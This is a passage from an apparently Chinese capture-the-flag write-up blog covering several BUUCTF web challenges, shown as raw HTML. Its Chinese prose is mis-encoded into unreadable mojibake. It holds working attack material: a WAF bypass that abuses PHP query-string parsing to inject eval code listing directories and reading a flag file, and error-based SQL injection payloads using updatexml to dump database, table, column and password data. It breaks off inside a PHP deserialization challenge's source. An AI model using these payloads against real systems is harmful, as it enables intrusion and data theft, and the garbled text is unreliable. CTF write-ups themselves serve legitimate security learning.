class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-title function_ invoke__\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>]))&#123;<br><br>  <span class=\"hljs-title function_ invoke__\">show_source</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br><br>    <span class=\"hljs-variable\">$str</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>];<br><br>    <span class=\"hljs-variable\">$blacklist</span> = [<span class=\"hljs-string\">&#x27; &#x27;</span>, <span class=\"hljs-string\">&#x27;\\t&#x27;</span>, <span class=\"hljs-string\">&#x27;\\r&#x27;</span>, <span class=\"hljs-string\">&#x27;\\n&#x27;</span>,<span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"hljs-string\">&#x27;&quot;&#x27;</span>, <span class=\"hljs-string\">&#x27;`&#x27;</span>, <span class=\"hljs-string\">&#x27;\\[&#x27;</span>, <span class=\"hljs-string\">&#x27;\\]&#x27;</span>,<span class=\"hljs-string\">&#x27;\\$&#x27;</span>,<span class=\"hljs-string\">&#x27;\\\\&#x27;</span>,<span class=\"hljs-string\">&#x27;\\^&#x27;</span>];<br><br>    <span class=\"hljs-keyword\">foreach</span> (<span class=\"hljs-variable\">$blacklist</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$blackitem</span>) &#123;<br><br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&#x27;/&#x27;</span> . <span class=\"hljs-variable\">$blackitem</span> . <span class=\"hljs-string\">&#x27;/m&#x27;</span>, <span class=\"hljs-variable\">$str</span>)) &#123;<br><br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;what are you want to do?&quot;</span>);<br><br>        &#125;<br><br>    &#125;<br><br>  <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&#x27;echo &#x27;</span>.<span class=\"hljs-variable\">$str</span>.<span class=\"hljs-string\">&#x27;;&#x27;</span>);<br><br>&#125;<br><br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure>\n\n<p>wafä¸»è¦å°±æ˜¯çœ‹æœ‰æ²¡æœ‰éæ•°å­—å­˜åœ¨ï¼Œç»•è¿‡wafå°±å¥½æ“ä½œäº†</p>\n<hr>\n<p>1.1PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</p>\n<p>è¿™æ˜¯åˆ«äººå¯¹PHPå­—ç¬¦ä¸²è§£ææ¼æ´çš„ç†è§£ï¼Œ<br>æˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚</p>\n<p>ä¾‹å¦‚ï¼š&#x2F;?foo&#x3D;barå˜æˆArray([foo] &#x3D;&gt; â€œbarâ€)ã€‚</p>\n<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚</p>\n<p>ä¾‹å¦‚ï¼Œ&#x2F;?%20news[id%00&#x3D;42ä¼šè½¬æ¢ä¸ºArray([news_id] &#x3D;&gt; 42)ã€‚</p>\n<p>å¦‚æœä¸€ä¸ªIDS&#x2F;IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š</p>\n<figure class=\"highlight haxe\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs haxe\">/<span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">s</span>.php?%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">s</span>[id%<span class=\"hljs-number\">00</span>=<span class=\"hljs-number\">42</span><span class=\"hljs-string\">&quot;+AND+1=0â€“</span><br></code></pre></td></tr></table></figure>\n\n<p>ä¸Šè¿°PHPè¯­å¥çš„å‚æ•°%20news[id%00çš„å€¼å°†å­˜å‚¨åˆ°$_GET[â€œnews_idâ€]ä¸­ã€‚</p>\n<p><u><strong>PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</strong></u></p>\n<pre><code>1.åˆ é™¤ç©ºç™½ç¬¦\n\n2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰\n</code></pre>\n<p>æˆ‘çš„ç†è§£ï¼š<br>å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼š</p>\n<pre><code>http://www.xxx.com/index.php?num = aaaa   //æ˜¾ç¤ºéæ³•è¾“å…¥çš„è¯\n</code></pre>\n<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼š</p>\n<pre><code>http://www.xxx.com/index.php? num = aaaa\n</code></pre>\n<p>è¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œï¼ˆç©ºæ ¼ï¼‰numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚</p>\n<p>ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼š<u>å…ˆæŠŠç©ºæ ¼ç»™å»æ‰</u>ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</p>\n<hr>\n<p>var_dump() </p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">åˆ—ä¸¾æ•°ç»„å†…å®¹<br></code></pre></td></tr></table></figure>\n\n<p>scandir() çš„ä½¿ç”¨ï¼š</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs maxima\">scandir(<span class=\"hljs-built_in\">directory</span>,sorting_order,<span class=\"hljs-built_in\">context</span>);<br><br> è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„,å°±æ˜¯æ˜¾ç¤ºæ–‡ä»¶å¤¹åå­—<br></code></pre></td></tr></table></figure>\n\n<p>file_get_contents() çš„ä½¿ç”¨ï¼š</p>\n<pre><code>åŸå‹ï¼šfile_get_contents(path,include_path,context,start,max_length)\nfile_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚\nå’Œ file() ä¸€æ ·ï¼Œä¸åŒçš„æ˜¯ file_get_contents() æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚\nfile_get_contents() å‡½æ•°æ˜¯ç”¨äºå°†æ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚\nå°±æ˜¯æ˜¾ç¤ºæ–‡ä»¶å†…å®¹\n</code></pre>\n<hr>\n<p>chr(47)æ˜¯<code>/</code>çš„ASCIIç¼–ç ï¼›ã€<code>/</code>å°±æ˜¯æ ¹ç›®å½•ï¼Œå¯ä»¥å…ˆè®¿é—®ä¸€ä¸‹æ ¹ç›®å½•ï¼Œæ‰¾æ‰¾å¤§æ¦‚flagåœ¨å“ªé‡Œã€‘</p>\n<p>chr(102)æ˜¯<code>f</code>çš„ASCIIç¼–ç ï¼›</p>\n<p>chr(49)æ˜¯<code>1</code>çš„ASCIIç¼–ç ï¼›</p>\n<p>chr(97)æ˜¯<code>a</code>çš„ASCIIç¼–ç ï¼›</p>\n<p>chr(103)æ˜¯<code>g</code>çš„ASCIIç¼–ç ã€‚</p>\n<p>ã€å­—ç¬¦é—´ç”¨<code>.</code>è¿æ¥ï¼Œå¦‚<code>flag</code>-&gt;<code>chr(102).chr(49).chr(97).chr(103)</code>ã€‘</p>\n<p>æ ¹æ®phpè§£æå­—ç¬¦ä¸²çš„ç‰¹æ€§</p>\n<p>å…ˆè¯•è¯•è¿”å›çœ‹çœ‹æ ¹ç›®å½•ï¼ˆ&#x2F;ï¼‰ä¸‹çš„æ–‡ä»¶æœ‰å“ªäº›</p>\n<p><code>http://node4.buuoj.cn:29105/calc.php?num=var_dump(scandir(chr(47)))</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220819232248275.png\" alt=\"image-20220819232248275\"></p>\n<p>çœ‹åˆ°æœ‰ä¸ª<code>flagg</code></p>\n<p>è¿”å›çœ‹çœ‹<code>/flagg</code>é‡Œçš„å†…å®¹</p>\n<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220819234552921.png\" alt=\"image-20220819234552921\"></p>\n<h2 id=\"5-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL\"><a href=\"#5-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL\" class=\"headerlink\" title=\"5.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL\"></a>5.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><h3 id=\"1-é¢˜ç›®æè¿°-3\"><a href=\"#1-é¢˜ç›®æè¿°-3\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-3\"><a href=\"#2-wp-3\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>çœ‹åå­—ï¼ŒçŒœæµ‹è¿™ä¸ªsqlæ³¨å…¥è¿‡æ»¤å¾ˆä¸¥</p>\n<p><img src=\"/post/wp-buuctf/image-20220821144626428.png\" alt=\"image-20220821144626428\"></p>\n<p>å…ˆè¯•è¯•fuzzæµ‹è¯•ï¼Œçœ‹çœ‹è¿‡æ»¤äº†å“ªäº›ï¼Œå‘ç°unionè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è”åˆæ³¨å…¥</p>\n<p><img src=\"/post/wp-buuctf/image-20220821144002573.png\" alt=\"image-20220821144002573\"></p>\n<p>ä½†æ˜¯å‘ç°updatexmlæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•æŠ¥é”™æ³¨å…¥</p>\n<p><img src=\"/post/wp-buuctf/image-20220821145036408.png\" alt=\"image-20220821145036408\"></p>\n<p>å…ˆæ„é€ payload</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\">?username=<span class=\"hljs-number\">1</span><span class=\"hljs-meta\">&amp;password=1&#x27;or updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br>ã€è¿™é‡Œ+è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œç”¨<span class=\"hljs-meta\">#ã€‘</span><br></code></pre></td></tr></table></figure>\n\n<p>ç»“æœå‘ç°ç»“æœåˆè¢«è¿‡æ»¤äº†ï¼Œåé¢ç”¨fuzzåˆæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œç”¨%0aå’Œå…¶ä»–ç¬¦å·ä¹Ÿä¸èƒ½æ›¿æ¢ï¼Œæ‰€ä»¥åªèƒ½è¯•è¯•()æŠŠç»“æœæ¡†èµ·æ¥è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs matlab\">?username=<span class=\"hljs-number\">1</span>&amp;password=<span class=\"hljs-number\">1</span>&#x27;or(updatexml(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0x7e</span>,database(),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))<span class=\"hljs-comment\">%23</span><br></code></pre></td></tr></table></figure>\n\n<p>å¾—åˆ°æ•°æ®åº“å</p>\n<p><img src=\"/post/wp-buuctf/image-20220821172827984.png\" alt=\"image-20220821172827984\"></p>\n<p>åé¢å°±æ˜¯å·®ä¸å¤šäº†ï¼Œä½†æ˜¯è¦æ³¨æ„ä¸èƒ½ç”¨ç©ºæ ¼ï¼Œè¦ç”¨()æ¡†ä½å¯¹è±¡</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(group_concat(table_name))<span class=\"hljs-keyword\">from</span>(information_schema.tables)<span class=\"hljs-keyword\">where</span>(table_schema)<span class=\"hljs-keyword\">like</span>(<span class=\"hljs-string\">&#x27;geek&#x27;</span>)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br>ã€è¿™é‡Œçš„=ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ç”¨<span class=\"hljs-keyword\">like</span>æ›¿æ¢ã€‘<br></code></pre></td></tr></table></figure>\n\n<p>å¾—åˆ°è¡¨å</p>\n<p><img src=\"/post/wp-buuctf/image-20220821173920231.png\" alt=\"image-20220821173920231\"></p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(group_concat(column_name))<span class=\"hljs-keyword\">from</span>(information_schema.columns)<span class=\"hljs-keyword\">where</span>(table_name)<span class=\"hljs-keyword\">like</span>(<span class=\"hljs-string\">&#x27;H4rDsq1&#x27;</span>)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure>\n\n<p>å¾—åˆ°åˆ—å</p>\n<p><img src=\"/post/wp-buuctf/image-20220821174239954.png\" alt=\"image-20220821174239954\"></p>\n<p>ç„¶åçœ‹çœ‹åˆ—é‡Œæ•°æ®æ‰¾æ‰¾flag</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(group_concat(id,username,<span class=\"hljs-keyword\">password</span>))<span class=\"hljs-keyword\">from</span>(H4rDsq1)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure>\n\n<p>çœ‹å›æ˜¾çŸ¥é“flagåœ¨passwordé‡Œï¼Œä½†ä¸ºä»€ä¹ˆæ˜¾ç¤ºä¸å…¨ï¼Œ<strong>æ˜¯å› ä¸ºupdatexmlæŠ¥é”™å›æ˜¾çš„æ•°æ®é™åˆ¶æœ€å¤š32ä½ï¼Œæ‰€ä»¥æ— æ³•æ˜¾ç¤ºå…¨flag</strong></p>\n<p><img src=\"/post/wp-buuctf/image-20220821174509553.png\" alt=\"image-20220821174509553\"></p>\n<p>æ‰€ä»¥å¯ä»¥ç”¨leftå’Œrightå‡½æ•°è¿›è¡Œåˆ†æ®µæ˜¾ç¤ºï¼Œæœ¬æ¥æƒ³ç”¨stustrå‡½æ•°ï¼Œä½†æ˜¯å‘ç°ä¹Ÿè¢«è¿‡æ»¤äº†</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(<span class=\"hljs-keyword\">left</span>(<span class=\"hljs-keyword\">password</span>,<span class=\"hljs-number\">30</span>))<span class=\"hljs-keyword\">from</span>(H4rDsq1)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure>\n\n<p>ä¸ºä»€ä¹ˆè¿™é‡Œleftå‡½æ•°æ˜¾ç¤º30ä¸ªå­—ç¬¦ï¼Œå› ä¸º0x7eä¹Ÿå°±æ˜¯<del>ä¹Ÿæ˜¯å­—ç¬¦ï¼Œ</del>å·²ç»å äº†ä¸¤ä½ï¼Œæ‰€ä»¥è¿˜å¯ä»¥æ˜¾ç¤º30ä½</p>\n<p><img src=\"/post/wp-buuctf/image-20220821220007687.png\" alt=\"image-20220821220007687\"></p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(<span class=\"hljs-keyword\">right</span>(<span class=\"hljs-keyword\">password</span>,<span class=\"hljs-number\">30</span>))<span class=\"hljs-keyword\">from</span>(H4rDsq1)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220821220041922.png\" alt=\"image-20220821220041922\"></p>\n<p>å› ä¸ºæ˜¯å·¦å³æ˜¾ç¤º30ä½ï¼Œæ‰€ä»¥flagå†…å®¹æœ‰é‡å ï¼Œæ•´ç†ä¸€ä¸‹</p>\n<p>å¾—åˆ°flag</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs maxima\">flag&#123;<span class=\"hljs-number\">034eb054</span>-<span class=\"hljs-number\">83b5</span>-412c-b90e-afc72c6ce998&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"6-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1\"><a href=\"#6-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1\" class=\"headerlink\" title=\"6.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1\"></a>6.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1</h2><p>1)é¢˜ç›®æè¿°</p>\n<p>æ— </p>\n<p>2)wp</p>\n<p>ä¸€é“å…¸å‹çš„åºåˆ—åŒ–é¢˜ç›®</p>\n<p>å…ˆå¯¹ä»£ç è¿›è¡Œåˆ†æ</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-keyword\">include</span>(<span class=\"hljs-string\">&quot;flag.php&quot;</span>);<br><br><span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br><br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$op</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$filename</span>;<br>    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-variable\">$content</span>;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">process</span>();<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">write</span>();<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">read</span>();<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-variable\">$res</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">write</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;filename) &amp;&amp; <span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;content)) &#123;<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">strlen</span>((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable language_\">$this</span>-&gt;content) &gt; <span class=\"hljs-number\">100</span>) &#123;<br>                <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Too long!&quot;</span>);<br>                <span class=\"hljs-keyword\">die</span>();<br>            &#125;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-title function_ invoke__\">file_put_contents</span>(<span class=\"hljs-variable\">$this</span>-&gt;filename, <span class=\"hljs-variable\">$this</span>-&gt;content);<br>            <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$res</span>) <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Successful!&quot;</span>);<br>            <span class=\"hljs-keyword\">else</span> <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">read</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;filename)) &#123;<br>            <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$this</span>-&gt;filename);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$res</span>;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">output</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$s</span>;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">is_valid</span>(<span class=\"hljs-params\"><span 